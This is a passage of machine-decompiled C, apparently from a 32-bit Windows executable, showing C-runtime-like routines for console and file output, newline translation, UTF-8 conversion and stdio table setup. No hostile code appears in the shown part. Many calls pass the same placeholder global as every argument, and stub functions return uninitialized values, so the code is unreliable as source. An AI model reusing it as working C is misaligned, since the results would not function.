    }
    // 0x40ab1a
    return &g118;
}

// Address range: 0x40ab24 - 0x40ab25
int32_t function_40ab24(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40ab24
    int32_t result; // 0x40ab24
    return result;
}

// Address range: 0x40ab26 - 0x40acd7
int32_t function_40ab26(int32_t a1, int32_t a2, uint32_t a3, int32_t a4) {
    int32_t v1 = 48 * (a2 & 63);
    int32_t * v2 = (int32_t *)(4 * a2 / 64 + (int32_t)&g207); // 0x40ab46
    int32_t v3 = *(int32_t *)(v1 + 24 + *v2); // 0x40ab57
    uint32_t v4 = a4 + a3; // 0x40ab61
    int32_t v5 = GetConsoleCP(); // 0x40ab66
    int32_t * v6 = (int32_t *)a1; // 0x40ab77
    *v6 = 0;
    int32_t * v7 = (int32_t *)(a1 + 4); // 0x40ab79
    *v7 = 0;
    int32_t * v8 = (int32_t *)(a1 + 8); // 0x40ab7c
    *v8 = 0;
    if (v4 <= a3) {
        // 0x40acc4
        return function_4065ae();
    }
    int32_t v9 = v1 + 45;
    int32_t v10 = v1 + 46;
    char v11; // bp-16, 0x40ab26
    int32_t v12 = &v11;
    int16_t v13; // bp-28, 0x40ab26
    int32_t v14 = &v13;
    int32_t v15; // bp-24, 0x40ab26
    int32_t v16 = &v15;
    int32_t v17; // bp-36, 0x40ab26
    int32_t v18 = &v17;
    int32_t * hFile2; // bp-32, 0x40ab26
    int32_t v19 = (int32_t)&hFile2;
    int32_t v20; // bp-72, 0x40ab26
    int32_t v21 = &v20; // 0x40ab26
    int32_t v22 = a3; // 0x40ac1c
    int32_t * v23; // 0x40ab26
    int32_t * v24; // 0x40ab26
    int32_t * v25; // 0x40ab26
    int32_t v26; // 0x40ab26
    int32_t v27; // 0x40ab26
    int32_t v28; // 0x40ab26
    char v29; // 0x40ab87
    unsigned char v30; // 0x40abc3
    int32_t v31; // 0x40abf7
    while (true) {
      lab_0x40ab87:
        // 0x40ab87
        v26 = v22;
        int32_t v32 = v21;
        char * v33 = (char *)v26; // 0x40ab87
        v29 = *v33;
        v13 = 0;
        int32_t v34 = *v2; // 0x40ab95
        char * v35 = (char *)(v34 + v9); // 0x40ab9c
        char v36 = *v35; // 0x40ab9c
        if ((v36 & 4) == 0) {
            int32_t v37 = function_40b69b((int32_t)v29, 0); // 0x40abbe
            v30 = *v33;
            if (*(int16_t *)(2 * (int32_t)v30 + v37) > -1) {
                // 0x40abf5
                *(int32_t *)(v32 - 4) = 1;
                v31 = v32 - 8;
                *(int32_t *)v31 = v26;
                goto lab_0x40abf8;
            } else {
                if (v26 >= v4) {
                    // break -> 0x40ac9b
                    break;
                }
                int32_t * v38 = (int32_t *)(v32 - 4);
                *v38 = 2;
                int32_t * v39 = (int32_t *)(v32 - 8);
                *v39 = v26;
                int32_t * v40 = (int32_t *)(v32 - 12);
                *v40 = v14;
                int32_t v41 = function_40bd5e((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40abe1
                if (v41 == -1) {
                    // 0x40acc4
                    return function_4065ae();
                }
                // 0x40abf2
                v23 = v40;
                v25 = v39;
                v24 = v38;
                v28 = v32;
                v27 = v26 + 1;
                goto lab_0x40ac0d;
            }
        } else {
            // 0x40aba5
            v11 = *(char *)(v34 + v10);
            *(int32_t *)(v32 - 4) = 2;
            *v35 = v36 & -5;
            int32_t v42 = v32 - 8; // 0x40abbb
            *(int32_t *)v42 = v12;
            v31 = v42;
            goto lab_0x40abf8;
        }
    }
    // 0x40ac9b
    *(char *)(*v2 + v10) = v30;
    char * v43 = (char *)(*v2 + v9); // 0x40acb2
    *v43 = *v43 | 4;
    *v7 = *v7 + 1;
    // 0x40acc4
    return function_4065ae();
  lab_0x40abf8:;
    int32_t * v44 = (int32_t *)(v31 - 4); // 0x40abfb
    *v44 = v14;
    int32_t v45 = function_40bd5e((int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40abfc
    if (v45 == -1) {
        // 0x40acc4
        return function_4065ae();
    }
    // 0x40abf8
    v23 = v44;
    v25 = (int32_t *)v31;
    v24 = (int32_t *)(v31 + 4);
    v28 = v31 + 8;
    v27 = v26;
    goto lab_0x40ac0d;
  lab_0x40ac0d:;
    int32_t v46 = v28;
    *v24 = 0;
    *v25 = 0;
    *v23 = 5;
    *(int32_t *)(v46 - 16) = v16;
    *(int32_t *)(v46 - 20) = 1;
    *(int32_t *)(v46 - 24) = v14;
    *(int32_t *)(v46 - 28) = 0;
    *(int32_t *)(v46 - 32) = v5;
    uint32_t hFile = WideCharToMultiByte((int32_t)&g266, (int32_t)&g266, (int16_t *)&g266, (int32_t)&g266, (char *)&g266, (int32_t)&g266, (char *)&g266, (bool *)&g266); // 0x40ac22
    if (hFile == 0) {
        // 0x40acc4
        return function_4065ae();
    }
    // 0x40ac33
    *(int32_t *)(v46 - 36) = 0;
    *(int32_t *)(v46 - 40) = v18;
    *(int32_t *)(v46 - 44) = hFile;
    *(int32_t *)(v46 - 48) = v16;
    int32_t v47 = v46 - 52; // 0x40ac3e
    *(int32_t *)v47 = v3;
    bool v48 = WriteFile((int32_t *)hFile, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266); // 0x40ac41
    if (!v48) {
        // 0x40acbc
        *v6 = GetLastError();
        goto lab_0x40acc4;
    }
    // 0x40ac4b
    v22 = v27 + 1;
    *v7 = v22 - a3 + *v8;
    if (v17 < hFile) {
        // 0x40acc4
        return function_4065ae();
    }
    // 0x40ac5e
    v21 = v47;
    if (v29 == 10) {
        // 0x40ac64
        *(int32_t *)(v46 - 56) = 0;
        hFile2 = (int32_t *)13;
        *(int32_t *)(v46 - 60) = v18;
        *(int32_t *)(v46 - 64) = 1;
        *(int32_t *)(v46 - 68) = v19;
        int32_t v49 = v46 - 72; // 0x40ac77
        *(int32_t *)v49 = v3;
        if (!WriteFile(hFile2, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266)) {
            // 0x40acbc
            *v6 = GetLastError();
            goto lab_0x40acc4;
        }
        // 0x40ac84
        if (v17 == 0) {
          lab_0x40acc4:
            // 0x40acc4
            return function_4065ae();
        }
        // 0x40ac8a
        *v8 = *v8 + 1;
        *v7 = *v7 + 1;
        v21 = v49;
    }
    // 0x40ac90
    if (v22 >= v4) {
        // 0x40acc4
        return function_4065ae();
    }
    goto lab_0x40ab87;
}

// Address range: 0x40acd7 - 0x40acd8
int32_t function_40acd7(int32_t * a1, int32_t a2, int32_t a3) {
    // 0x40acd7
    int32_t result; // 0x40acd7
    return result;
}

// Address range: 0x40acd9 - 0x40ad44
int32_t function_40acd9(int32_t result, uint32_t a2, int32_t a3) {
    int32_t * v1 = (int32_t *)result; // 0x40ace8
    *v1 = 0;
    int32_t * v2 = (int32_t *)(result + 4); // 0x40acea
    *v2 = 0;
    int32_t * v3 = (int32_t *)(result + 8); // 0x40aced
    *v3 = 0;
    uint32_t v4 = a3 + a2; // 0x40acf3
    if (v4 <= a2) {
        // 0x40ad3b
        return result;
    }
    // 0x40acfc
    int32_t v5; // bp-20, 0x40acd9
    int32_t * v6 = (int32_t *)((int32_t)&v5 - 4); // 0x40acff
    int32_t v7 = a2; // 0x40ad29
    uint16_t v8 = *(int16_t *)v7; // 0x40acfc
    *v6 = (int32_t)v8;
    while (v8 == (int16_t)function_40e6c0((int32_t)&g266)) {
        // 0x40ad0b
        *v2 = *v2 + 2;
        if (v8 == 10) {
            // 0x40ad14
            *v6 = 13;
            if ((int16_t)function_40e6c0((int32_t)&g266) != 13) {
                // break -> 0x40ad33
                break;
            }
            // 0x40ad23
            *v2 = *v2 + 1;
            *v3 = *v3 + 1;
        }
        // 0x40ad29
        v7 += 2;
        if (v7 >= v4) {
            // 0x40ad3b
            return result;
        }
        v8 = *(int16_t *)v7;
        *v6 = (int32_t)v8;
    }
    // 0x40ad33
    *v1 = GetLastError();
    // 0x40ad3b
    return result;
}

// Address range: 0x40ad44 - 0x40ad45
int32_t function_40ad44(int32_t a1) {
    // 0x40ad44
    int32_t result; // 0x40ad44
    return result;
}

// Address range: 0x40ad46 - 0x40adba
int32_t function_40ad46(int32_t a1) {
    // 0x40ad46
    int32_t v1; // 0x40ad46
    int32_t v2; // 0x40ad46
    int32_t v3; // 0x40ad46
    int32_t v4 = function_40e5d1(a1, v1, v3, v2); // 0x40ad4f
    if (v4 == 0) {
        // 0x40adb5
        return v4 & -256;
    }
    int32_t v5 = 48 * (a1 & 63);
    int32_t * v6 = (int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40ad69
    int32_t v7 = *v6; // 0x40ad69
    if (*(char *)(v5 + 40 + v7) > -1) {
        // 0x40adb5
        return v7 & -256;
    }
    int32_t v8 = *(int32_t *)(function_40ba33() + 76); // 0x40ad7c
    int32_t v9 = *v6;
    int32_t v10 = v9 + v5;
    if (*(int32_t *)(v8 + 168) == 0) {
        // 0x40ad88
        if (*(char *)(v10 + 41) == 0) {
            // 0x40adb5
            return v9 & -256;
        }
    }
    // 0x40ad9a
    int32_t lpMode; // bp-8, 0x40ad46
    bool v11 = GetConsoleMode((int32_t *)*(int32_t *)(v10 + 24), &lpMode); // 0x40ada9
    // 0x40adb5
    return (v11 ? -256 : 0) | (int32_t)v11;
}

// Address range: 0x40adba - 0x40adbb
int32_t function_40adba(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40adba
    int32_t result; // 0x40adba
    return result;
}

// Address range: 0x40adbc - 0x40ae99
int32_t function_40adbc(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40adbc
    int32_t v1; // 0x40adbc
    function_411460(v1);
    int32_t v2 = *(int32_t *)(4 * a2 / 64 + (int32_t)&g207); // 0x40ade5
    int32_t * v3 = (int32_t *)a1; // 0x40adf8
    *v3 = 0;
    uint32_t v4 = a4 + a3; // 0x40adfb
    int32_t * v5 = (int32_t *)(a1 + 4); // 0x40adfd
    *v5 = 0;
    int32_t * v6 = (int32_t *)(a1 + 8); // 0x40ae01
    *v6 = 0;
    int32_t v7; // bp-5128, 0x40adbc
    int32_t v8 = &v7;
    int32_t v9 = a3; // 0x40ae11
    int32_t v10; // bp-16, 0x40adbc
    int32_t v11 = &v10; // 0x40ae11
    while (v9 < v4) {
        int32_t v12 = v8;
        int32_t v13 = v9;
        v9 = v13;
        int32_t v14 = v12; // 0x40ae1b
        while (v13 < v4) {
            char v15 = *(char *)v13; // 0x40ae1d
            int32_t v16 = v12; // 0x40ae22
            if (v15 == 10) {
                // 0x40ae24
                *v6 = *v6 + 1;
                *(char *)v12 = 13;
                v16 = v12 + 1;
            }
            int32_t v17 = v13 + 1; // 0x40ae1f
            *(char *)v16 = v15;
            int32_t v18 = v16 + 1; // 0x40ae30
            v9 = v17;
            v14 = v18;
            int32_t v19; // bp-9, 0x40adbc
            if (v18 >= (int32_t)&v19) {
                // break -> 0x40ae3b
                break;
            }
            v12 = v18;
            v13 = v17;
            v9 = v13;
            v14 = v12;
        }
        uint32_t v20 = v14 - v8; // 0x40ae41
        *(int32_t *)(v11 - 4) = 0;
        int32_t v21; // bp-5136, 0x40adbc
        *(int32_t *)(v11 - 8) = (int32_t)&v21;
        *(int32_t *)(v11 - 12) = v20;
        *(int32_t *)(v11 - 16) = v8;
        v11 -= 20;
        *(int32_t *)v11 = *(int32_t *)(48 * (a2 & 63) + 24 + v2);
        if (!WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266)) {
            // 0x40ae7e
            *v3 = GetLastError();
            return function_4065ae();
        }
        // 0x40ae5f
        *v5 = *v5 + v21;
        if (v21 < v20) {
            // break -> 0x40ae86
            break;
        }
    }
  lab_0x40ae86:
    // 0x40ae86
    return function_4065ae();
}

// Address range: 0x40ae99 - 0x40ae9a
int32_t function_40ae99(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40ae99
    int32_t result; // 0x40ae99
    return result;
}

// Address range: 0x40ae9b - 0x40af87
int32_t function_40ae9b(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40ae9b
    int32_t v1; // 0x40ae9b
    function_411460(v1);
    int32_t v2 = *(int32_t *)(4 * a2 / 64 + (int32_t)&g207); // 0x40aec4
    uint32_t v3 = a4 + a3; // 0x40aed7
    int32_t * v4 = (int32_t *)a1; // 0x40aee7
    *v4 = 0;
    int32_t * v5 = (int32_t *)(a1 + 4); // 0x40aee9
    *v5 = 0;
    int32_t * v6 = (int32_t *)(a1 + 8); // 0x40aeec
    *v6 = 0;
    int32_t v7; // bp-5128, 0x40ae9b
    int32_t v8 = &v7;
    int32_t v9 = a3; // 0x40aeef
    int32_t v10; // bp-16, 0x40ae9b
    int32_t v11 = &v10; // 0x40aeef
    while (v9 < v3) {
        int32_t * v12 = (int32_t *)(v11 - 4);
        int32_t v13 = v8;
        int32_t v14 = v9;
        v9 = v14;
        int32_t v15 = v13; // 0x40aef9
        while (v14 < v3) {
            int16_t v16 = *(int16_t *)v14; // 0x40aefb
            int32_t v17 = v13; // 0x40af04
            if (v16 == 10) {
                // 0x40af06
                *v6 = *v6 + 2;
                *v12 = 13;
                *(int16_t *)v13 = 13;
                v17 = v13 + 2;
            }
            int32_t v18 = v14 + 2; // 0x40aefe
            *(int16_t *)v17 = v16;
            int32_t v19 = v17 + 2; // 0x40af19
            v9 = v18;
            v15 = v19;
            int32_t v20; // bp-10, 0x40ae9b
            if (v19 >= (int32_t)&v20) {
                // break -> 0x40af26
                break;
            }
            v13 = v19;
            v14 = v18;
            v9 = v14;
            v15 = v13;
        }
        // 0x40af26
        *v12 = 0;
        int32_t v21; // bp-5136, 0x40ae9b
        *(int32_t *)(v11 - 8) = (int32_t)&v21;
        uint32_t v22 = v15 - v8 & -2; // 0x40af37
        *(int32_t *)(v11 - 12) = v22;
        *(int32_t *)(v11 - 16) = v8;
        v11 -= 20;
        *(int32_t *)v11 = *(int32_t *)(48 * (a2 & 63) + 24 + v2);
        if (!WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266)) {
            // 0x40af6c
            *v4 = GetLastError();
            return function_4065ae();
        }
        // 0x40af4d
        *v5 = *v5 + v21;
        if (v21 < v22) {
            // break -> 0x40af74
            break;
        }
    }
  lab_0x40af74:
    // 0x40af74
    return function_4065ae();
}

// Address range: 0x40af87 - 0x40af88
int32_t function_40af87(int32_t * a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40af87
    int32_t result; // 0x40af87
    return result;
}

// Address range: 0x40af89 - 0x40b0b4
int32_t function_40af89(int32_t a1, int32_t a2, uint32_t a3, int32_t a4) {
    // 0x40af89
    int32_t v1; // 0x40af89
    function_411460(v1);
    int32_t v2 = *(int32_t *)(4 * a2 / 64 + (int32_t)&g207); // 0x40afb0
    uint32_t v3 = a4 + a3; // 0x40afcf
    int32_t * v4 = (int32_t *)a1; // 0x40afd1
    *v4 = 0;
    int32_t * v5 = (int32_t *)(a1 + 4); // 0x40afd3
    *v5 = 0;
    *(int32_t *)(a1 + 8) = 0;
    if (v3 <= a3) {
        // 0x40b0a1
        return function_4065ae();
    }
    // 0x40afe7
    int32_t v6; // bp-1716, 0x40af89
    int32_t v7 = &v6; // 0x40afed
    int32_t v8; // bp-5132, 0x40af89
    int32_t v9 = &v8; // 0x40b025
    int32_t v10; // bp-16, 0x40af89
    int32_t v11 = &v10; // 0x40b062
    int32_t * v12 = (int32_t *)(v11 - 4);
    int32_t v13 = a3;
    int32_t v14 = v7;
    int32_t v15 = v14; // 0x40aff5
    int32_t v16 = v13; // 0x40aff5
    int32_t v17; // 0x40af89
    int32_t v18; // bp-12, 0x40af89
    int16_t v19; // 0x40aff7
    int32_t v20; // 0x40affa
    int32_t v21; // 0x40b00e
    while (v13 < v3) {
        // 0x40aff7
        v19 = *(int16_t *)v13;
        v17 = v14;
        if (v19 == 10) {
            // 0x40b002
            *v12 = 13;
            *(int16_t *)v14 = 13;
            v17 = v14 + 2;
        }
        // 0x40b00b
        v20 = v13 + 2;
        *(int16_t *)v17 = v19;
        v21 = v17 + 2;
        v15 = v21;
        v16 = v20;
        if (v21 >= (int32_t)&v18) {
            // break -> 0x40b018
            break;
        }
        v13 = v20;
        v14 = v21;
        v15 = v14;
        v16 = v13;
    }
    // 0x40b018
    *v12 = 0;
    *(int32_t *)(v11 - 8) = 0;
    *(int32_t *)(v11 - 12) = 3413;
    *(int32_t *)(v11 - 16) = v9;
    *(int32_t *)(v11 - 20) = (v15 - v7) / 2;
    *(int32_t *)(v11 - 24) = v7;
    *(int32_t *)(v11 - 28) = 0;
    int32_t v22 = v11 - 32; // 0x40b035
    *(int32_t *)v22 = 0xfde9;
    uint32_t v23 = WideCharToMultiByte((int32_t)&g266, (int32_t)&g266, (int16_t *)&g266, (int32_t)&g266, (char *)&g266, (int32_t)&g266, (char *)&g266, (bool *)&g266); // 0x40b03a
    int32_t v24 = 0; // 0x40b04b
    while (v23 != 0) {
        // 0x40afe7
        *(int32_t *)(v22 - 4) = 0;
        int32_t v25; // bp-5140, 0x40af89
        *(int32_t *)(v22 - 8) = (int32_t)&v25;
        *(int32_t *)(v22 - 12) = v23 - v24;
        *(int32_t *)(v22 - 16) = v24 + v9;
        v11 = v22 - 20;
        *(int32_t *)v11 = *(int32_t *)(48 * (a2 & 63) + 24 + v2);
        if (!WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266)) {
            // break (via goto) -> 0x40b099
            goto lab_0x40b099;
        }
        // 0x40b072
        v24 += v25;
        int32_t v26 = v11; // 0x40b080
        while (v24 < v23) {
            // 0x40b04d
            *(int32_t *)(v26 - 4) = 0;
            *(int32_t *)(v26 - 8) = (int32_t)&v25;
            *(int32_t *)(v26 - 12) = v23 - v24;
            *(int32_t *)(v26 - 16) = v24 + v9;
            v11 = v26 - 20;
            *(int32_t *)v11 = *(int32_t *)(48 * (a2 & 63) + 24 + v2);
            if (!WriteFile(&g266, &g266, (int32_t)&g266, &g266, (struct _OVERLAPPED *)&g266)) {
                // break (via goto) -> 0x40b099
                goto lab_0x40b099;
            }
            // 0x40b072
            v24 += v25;
            v26 = v11;
        }
        // 0x40b082
        *v5 = v16 - a3;
        if (v16 >= v3) {
            // 0x40b0a1
            return function_4065ae();
        }
        v12 = (int32_t *)(v11 - 4);
        v13 = v16;
        v14 = v7;
        v15 = v14;
        v16 = v13;
        while (v13 < v3) {
            // 0x40aff7
            v19 = *(int16_t *)v13;
            v17 = v14;
            if (v19 == 10) {
                // 0x40b002
                *v12 = 13;
                *(int16_t *)v14 = 13;
                v17 = v14 + 2;
            }
            // 0x40b00b
            v20 = v13 + 2;
            *(int16_t *)v17 = v19;
            v21 = v17 + 2;
            v15 = v21;
            v16 = v20;
            if (v21 >= (int32_t)&v18) {
                // break -> 0x40b018
                break;
            }
            v13 = v20;
            v14 = v21;
            v15 = v14;
            v16 = v13;
        }
        // 0x40b018
        *v12 = 0;
        *(int32_t *)(v11 - 8) = 0;
        *(int32_t *)(v11 - 12) = 3413;
        *(int32_t *)(v11 - 16) = v9;
        *(int32_t *)(v11 - 20) = (v15 - v7) / 2;
        *(int32_t *)(v11 - 24) = v7;
        *(int32_t *)(v11 - 28) = 0;
        v22 = v11 - 32;
        *(int32_t *)v22 = 0xfde9;
        v23 = WideCharToMultiByte((int32_t)&g266, (int32_t)&g266, (int16_t *)&g266, (int32_t)&g266, (char *)&g266, (int32_t)&g266, (char *)&g266, (bool *)&g266);
        v24 = 0;
    }
  lab_0x40b099:
    // 0x40b099
    *v4 = GetLastError();
    // 0x40b0a1
    return function_4065ae();
}

// Address range: 0x40b0b4 - 0x40b19f
int32_t function_40b0b4(int32_t a1) {
    // 0x40b0b4
    function_406770(&g93, 20, (int32_t)&g266);
    int32_t v1; // 0x40b0b4
    uint32_t v2 = *(int32_t *)(v1 + 8); // 0x40b0c0
    int32_t result; // 0x40b199
    if (v2 == -2) {
        // 0x40b0c8
        *(int32_t *)function_40aafe() = 0;
        *(int32_t *)function_40ab11() = 9;
        // 0x40b199
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    if (v2 >= 0) {
        // 0x40b0e8
        if (v2 < g209) {
            int32_t v3 = 48 * (v2 & 63);
            int32_t * v4 = (int32_t *)(v1 - 32); // 0x40b101
            *v4 = v3;
            int32_t * v5 = (int32_t *)(4 * v2 / 64 + (int32_t)&g207); // 0x40b104
            if ((*(char *)(v3 + 40 + *v5) & 1) != 0) {
                // 0x40b115
                function_40d8f5(v2);
                int32_t * v6 = (int32_t *)(v1 - 28); // 0x40b11f
                *v6 = -1;
                int32_t * v7 = (int32_t *)(v1 - 4); // 0x40b122
                *v7 = 0;
                if ((*(char *)(*v5 + 40 + *v4) & 1) != 0) {
                    // 0x40b14c
                    *v6 = function_40b19f(v2, *(int32_t *)(v1 + 12), *(int32_t *)(v1 + 16));
                } else {
                    // 0x40b137
                    *(int32_t *)function_40ab11() = 9;
                    *(int32_t *)function_40aafe() = 0;
                }
                // 0x40b160
                *v7 = -2;
                function_40b176();
                // 0x40b199
                result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
                return result;
            }
        }
    }
    // 0x40b17e
    *(int32_t *)function_40aafe() = 0;
    *(int32_t *)function_40ab11() = 9;
    // 0x40b199
    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40b176 - 0x40b17e
int32_t function_40b176(void) {
    // 0x40b176
    int32_t v1; // 0x40b176
    return function_40d918(v1);
}

// Address range: 0x40b19f - 0x40b3ab
int32_t function_40b19f(int32_t a1, int32_t lpBuffer, int32_t nNumberOfBytesToWrite) {
    // 0x40b19f
    if (nNumberOfBytesToWrite == 0) {
        // 0x40b39b
        return function_4065ae();
    }
    if (lpBuffer == 0) {
        int32_t * v1 = (int32_t *)function_40aafe(); // 0x40b1d6
        *v1 = *v1 & lpBuffer;
        *(int32_t *)function_40ab11() = 22;
        // 0x40b39b
        return function_4065ae();
    }
    int32_t v2 = 48 * (a1 & 63);
    int32_t * v3 = (int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40b201
    int32_t v4 = *v3; // 0x40b201
    char v5 = *(char *)(v2 + 41 + v4); // 0x40b20e
    if (v5 != 2 != v5 != 1) {
        if ((nNumberOfBytesToWrite & 1) != 0) {
            // 0x40b224
            *(int32_t *)function_40aafe() = 0;
            *(int32_t *)function_40ab11() = 22;
            // 0x40b39b
            return function_4065ae();
        }
    }
    int32_t v6 = v2 + 40;
    int32_t v7; // bp-80, 0x40b19f
    if ((*(char *)(v4 + v6) & 32) != 0) {
        // 0x40b24b
        v7 = a1;
        int32_t v8; // 0x40b19f
        int32_t v9; // 0x40b19f
        int32_t v10; // 0x40b19f
        function_40e6a5(a1, 0, 0, 2, v10, v8, v9, lpBuffer, v4);
    }
    // 0x40b25a
    int32_t v11; // 0x40b19f
    int32_t v12; // 0x40b19f
    int32_t errorCode; // bp-24, 0x40b19f
    int32_t v13; // 0x40b19f
    if ((char)function_40ad44(a1) == 0) {
        int32_t v14 = *v3; // 0x40b2a1
        if (*(char *)(v14 + v6) > -1) {
            int32_t hFile = *(int32_t *)(v2 + 24 + v14); // 0x40b2f8
            errorCode = 0;
            int32_t lpNumberOfBytesWritten = 0; // bp-20, 0x40b302
            v7 = lpBuffer;
            int32_t v15 = hFile; // bp-84, 0x40b310
            if (!WriteFile((int32_t *)hFile, (int32_t *)lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL)) {
                // 0x40b31b
                errorCode = GetLastError();
            }
            // 0x40b324
            v12 = &v15;
            v13 = &errorCode;
            goto lab_0x40b327;
        } else {
            if (v5 == 0) {
                // 0x40b2e8
                v7 = &errorCode;
                v11 = function_40adba(&errorCode, a1, lpBuffer, nNumberOfBytesToWrite);
                goto lab_0x40b299;
            } else {
                int32_t v16 = (int32_t)v5 - 1; // 0x40b2ba
                if (v16 == 0) {
                    // 0x40b2d8
                    v7 = &errorCode;
                    v11 = function_40af87(&errorCode, a1, lpBuffer, nNumberOfBytesToWrite);
                    goto lab_0x40b299;
                } else {
                    if (v16 != 1) {
                        goto lab_0x40b362;
                    } else {
                        // 0x40b2c8
                        v7 = &errorCode;
                        v11 = function_40ae99(&errorCode, a1, lpBuffer, nNumberOfBytesToWrite);
                        goto lab_0x40b299;
                    }
                }
            }
        }
    } else {
        if (v5 == 0) {
            // 0x40b28b
            v7 = &errorCode;
            v11 = function_40ab24(&errorCode, a1, lpBuffer, nNumberOfBytesToWrite);
            goto lab_0x40b299;
        } else {
            if (v5 < 3) {
                int32_t v17 = function_40acd7(&errorCode, lpBuffer, nNumberOfBytesToWrite); // 0x40b27c
            } else {
                goto lab_0x40b362;
            }
        }
    }
  lab_0x40b327:;
    int32_t v18 = *(int32_t *)v13; // bp-44, 0x40b32a
    bool v19; // 0x40b19f
    int32_t v20 = v19 ? -4 : 4; // 0x40b32a
    int32_t v21 = v20 + (int32_t)&v18; // 0x40b32a
    int32_t v22 = v13 + v20; // 0x40b32a
    *(int32_t *)v21 = *(int32_t *)v22;
    *(int32_t *)(v21 + v20) = *(int32_t *)(v22 + v20);
    int32_t v23; // 0x40b19f
    if (v23 != 0) {
        // 0x40b39b
        return function_4065ae();
    }
    // 0x40b334
    if (v18 != 0) {
        int32_t * v24 = (int32_t *)(v12 - 4); // 0x40b33b
        *v24 = 5;
        if (v18 != 5) {
            // 0x40b356
            *v24 = v18;
            function_40aadb();
        } else {
            // 0x40b342
            *(int32_t *)function_40ab11() = 9;
            *(int32_t *)function_40aafe() = 5;
        }
        // 0x40b39b
        return function_4065ae();
    }
    goto lab_0x40b362;
  lab_0x40b299:
    // 0x40b299
    v12 = (int32_t)&v7 + 16;
    v13 = v11;
    goto lab_0x40b327;
  lab_0x40b362:
    // 0x40b362
    if ((*(char *)(*v3 + v6) & 64) != 0) {
        // 0x40b376
        if (*(char *)lpBuffer == 26) {
            // 0x40b39b
            return function_4065ae();
        }
    }
    // 0x40b37f
    *(int32_t *)function_40ab11() = 28;
    *(int32_t *)function_40aafe() = 0;
    // 0x40b39b
    return function_4065ae();
}

// Address range: 0x40b3ab - 0x40b3ac
int32_t function_40b3ab(int32_t a1) {
    // 0x40b3ab
    int32_t result; // 0x40b3ab
    return result;
}

// Address range: 0x40b3ad - 0x40b3d1
int32_t function_40b3ad(int32_t a1) {
    if (a1 != 0) {
        // 0x40b3cc
        return *(int32_t *)(a1 + 16);
    }
    // 0x40b3b7
    *(int32_t *)function_40ab11() = 22;
    return -1;
}

// Address range: 0x40b3d1 - 0x40b499
int32_t function_40b3d1(void) {
    int32_t v1 = g202; // 0x40b3d1
    int32_t v2 = 3; // bp-8, 0x40b3d7
    int32_t v3 = 512; // 0x40b3dc
    int32_t v4; // 0x40b3d1
    if (v1 != 0) {
        // 0x40b3e5
        v3 = 3;
        v4 = v1;
        if (v1 < 3) {
            goto lab_0x40b3eb;
        } else {
            goto lab_0x40b3f0;
        }
    } else {
        goto lab_0x40b3eb;
    }
  lab_0x40b3eb:
    // 0x40b3eb
    g202 = v3;
    v4 = v3;
    goto lab_0x40b3f0;
  lab_0x40b3f0:
    // 0x40b3f0
    v2 = 4;
    g203 = function_40c4a1(v4, 4);
    function_40bbdc(0);
    if (g203 == 0) {
        // 0x40b410
        v2 = 4;
        g202 = 3;
        g203 = function_40c4a1(3, 4);
        function_40bbdc(0);
        if (g203 == 0) {
            // 0x40b436
            return -1;
        }
    }
    int32_t v5 = &v2; // 0x40b43e
    int32_t v6 = 0; // 0x40b43e
    int32_t v7 = &g120;
    *(int32_t *)(v5 - 4) = 0;
    *(int32_t *)(v5 - 8) = 4000;
    int32_t v8 = v5 - 12; // 0x40b44d
    *(int32_t *)v8 = v7 + 32;
    function_40c278((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    *(int32_t *)(g203 + 4 * v6) = v7;
    int32_t v9 = *(int32_t *)(4 * v6 / 64 + (int32_t)&g207); // 0x40b468
    uint32_t v10 = *(int32_t *)(48 * (v6 & 63) + 24 + v9); // 0x40b46f
    if (v10 < 0xfffffffe != v10 != 0) {
        // 0x40b481
        *(int32_t *)(v7 + 16) = -2;
    }
    int32_t v11 = v7 + 56; // 0x40b488
    v5 = v8;
    v6++;
    while (v11 != (int32_t)&g121) {
        // 0x40b443
        v7 = v11;
        *(int32_t *)(v5 - 4) = 0;
        *(int32_t *)(v5 - 8) = 4000;
        v8 = v5 - 12;
        *(int32_t *)v8 = v7 + 32;
        function_40c278((int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        *(int32_t *)(g203 + 4 * v6) = v7;
        v9 = *(int32_t *)(4 * v6 / 64 + (int32_t)&g207);
        v10 = *(int32_t *)(48 * (v6 & 63) + 24 + v9);
        if (v10 < 0xfffffffe != v10 != 0) {
            // 0x40b481
            *(int32_t *)(v7 + 16) = -2;
        }
        // 0x40b488
        v11 = v7 + 56;
        v5 = v8;
        v6++;
    }
    // 0x40b436
    return 0;
}

// Address range: 0x40b49b - 0x40b4e5
int32_t function_40b49b(void) {
    // 0x40b49b
    int32_t v1; // 0x40b49b
    function_40b5ba(v1);
    function_40e705();
    int32_t v2; // bp-4, 0x40b49b
    int32_t v3 = &v2; // 0x40b4a6
    int32_t v4; // 0x40b49b
    for (int32_t i = 0; i < 9; i += 4) {
        // 0x40b4a8
        v4 = v3;
        v3 = v4 - 4;
        int32_t * v5 = (int32_t *)v3; // 0x40b4ad
        *v5 = *(int32_t *)(g203 + i);
        function_40e7a5((int32_t)&g266);
        *v5 = *(int32_t *)(g203 + i) + 32;
